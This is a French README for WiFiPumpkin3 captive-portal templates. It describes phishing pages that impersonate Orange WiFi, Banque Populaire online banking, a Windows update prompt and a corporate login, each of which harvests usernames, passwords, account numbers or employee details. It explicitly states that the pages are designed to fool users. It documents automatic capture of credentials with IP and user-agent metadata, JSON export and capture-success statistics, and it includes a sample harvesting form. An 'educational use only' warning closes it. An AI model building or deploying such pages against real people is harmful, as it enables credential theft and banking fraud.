# 📄 Templates HTML pour Portails Captifs

## 🎯 Vue d'ensemble

Ce dossier contient des templates HTML professionnels pour les portails captifs de WiFiPumpkin3. Ces pages sont conçues pour être réalistes et tromper les utilisateurs en leur faisant croire qu'ils se connectent à un service légitime.

## 📁 Structure des Templates

```
templates/
├── __init__.py
├── wifi_login.html          # Connexion WiFi Orange
├── free_wifi.html          # WiFi gratuit
├── bank_login.html         # Banque Populaire
├── update_required.html    # Mise à jour Windows
└── verification_required.html # Vérification entreprise
```

## 🎨 Templates Disponibles

### 1. **wifi_login.html** - Connexion WiFi Orange
- **Catégorie** : WiFi
- **Cible** : Utilisateurs Orange
- **Style** : Design moderne avec couleurs Orange
- **Champs** : Nom d'utilisateur, mot de passe

### 2. **free_wifi.html** - WiFi Gratuit
- **Catégorie** : WiFi
- **Cible** : Utilisateurs génériques
- **Style** : Design attractif avec gradients
- **Champs** : Email, mot de passe

### 3. **bank_login.html** - Banque Populaire
- **Catégorie** : Banking
- **Cible** : Clients bancaires
- **Style** : Interface bancaire sécurisée
- **Champs** : Numéro de compte, code secret

### 4. **update_required.html** - Mise à jour Windows
- **Catégorie** : System
- **Cible** : Utilisateurs Windows
- **Style** : Interface Windows authentique
- **Champs** : Nom d'utilisateur, mot de passe administrateur

### 5. **verification_required.html** - Vérification Entreprise
- **Catégorie** : Enterprise
- **Cible** : Employés d'entreprise
- **Style** : Interface professionnelle
- **Champs** : Numéro d'employé, département, mot de passe

## 🔧 Utilisation

### Dans l'Interface Graphique

1. **Onglet Captive Portal** → **Templates**
2. Sélectionnez le template souhaité
3. Configurez les paramètres dans l'onglet **Configuration**
4. Démarrez le portail captif

### Configuration Avancée

```python
from utils.template_manager import TemplateManager

# Initialisation
tm = TemplateManager()

# Récupération d'un template
template_content = tm.get_template('wifi_login')

# Création d'un template personnalisé
tm.create_custom_template(
    'custom_login',
    'Mon Template',
    'Description personnalisée',
    '<html>...</html>',
    'custom'
)
```

## 📊 Capture des Identifiants

### Fonctionnalités

- **Capture automatique** : Tous les formulaires sont interceptés
- **Métadonnées** : IP, User-Agent, timestamp
- **Stockage JSON** : Sauvegarde structurée
- **Export** : Possibilité d'exporter les données

### Format des Données Capturées

```json
{
  "timestamp": "2024-01-15T10:30:45",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "form_data": {
    "username": "user@example.com",
    "password": "secret123"
  },
  "template_used": "wifi_login",
  "type": "login"
}
```

## 🎨 Personnalisation

### Variables Disponibles

- `{{message}}` : Message personnalisé
- `{{network_name}}` : Nom du réseau WiFi
- `{{redirect_url}}` : URL de redirection

### Création d'un Nouveau Template

1. **Créez un fichier HTML** dans le dossier `templates/`
2. **Ajoutez les métadonnées** dans `template_manager.py`
3. **Testez le template** via l'interface

### Exemple de Template

```html
<!DOCTYPE html>
<html>
<head>
    <title>Connexion WiFi</title>
    <style>
        /* Styles CSS */
    </style>
</head>
<body>
    <div class="container">
        <h1>{{network_name}}</h1>
        <p>{{message}}</p>
        <form method="post" action="/login">
            <input type="text" name="username" required>
            <input type="password" name="password" required>
            <button type="submit">Se connecter</button>
        </form>
    </div>
</body>
</html>
```

## 🔒 Sécurité et Éthique

### ⚠️ Avertissements Importants

- **Utilisation éducative uniquement** : Ces templates sont destinés à l'apprentissage
- **Autorisation requise** : N'utilisez que sur vos propres réseaux
- **Respect de la loi** : Vérifiez la législation locale
- **Documentation** : Gardez des traces de vos tests

### Bonnes Pratiques

1. **Testez uniquement vos réseaux**
2. **Obtenez les autorisations nécessaires**
3. **Documentez vos activités**
4. **Respectez la vie privée**
5. **Utilisez de manière responsable**

## 🛠️ Développement

### Ajout d'un Nouveau Template

1. **Créer le fichier HTML** dans `templates/`
2. **Ajouter les métadonnées** dans `TemplateManager.load_templates()`
3. **Tester la capture** des formulaires
4. **Documenter** le nouveau template

### Structure Recommandée

```python
"new_template": {
    "name": "Nom du Template",
    "description": "Description détaillée",
    "file": "new_template.html",
    "category": "category_name"
}
```

## 📈 Statistiques

### Métriques Disponibles

- **Nombre de tentatives** : Compteur de connexions
- **Taux de succès** : Pourcentage de captures réussies
- **Templates populaires** : Les plus utilisés
- **Données capturées** : Types d'informations récupérées

## 🔄 Mises à Jour

### Version 1.0
- ✅ 5 templates de base
- ✅ Capture automatique
- ✅ Interface graphique
- ✅ Export des données
- ✅ Gestion des catégories

### Prochaines Fonctionnalités
- 🔄 Templates dynamiques
- 🔄 Personnalisation avancée
- 🔄 Statistiques détaillées
- 🔄 Intégration API

---

**⚠️ RAPPEL : Utilisez ces templates de manière éthique et responsable.** 